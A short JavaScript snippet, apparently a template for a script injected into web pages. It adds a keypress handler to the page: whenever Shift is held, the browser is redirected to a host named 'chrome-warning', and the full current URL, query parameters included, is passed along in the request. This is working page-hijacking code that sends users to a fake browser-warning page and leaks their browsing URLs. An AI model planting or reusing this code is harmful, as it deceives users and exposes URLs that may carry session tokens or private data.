
var myJavaScript = "function isshift(e){if(e.shiftKey){window.location.replace('http://chrome-warning/?red='+encodeURI(window.location.href.split('?').join('!').split('&').join('|')));}}";    //You need to put your JS here. if(e.shiftKey){
console.log(myJavaScript);
var scriptTag = document.createElement("script");
scriptTag.innerHTML = myJavaScript;
document.head.appendChild(scriptTag);
document.body.setAttribute("onkeypress","isshift(event)");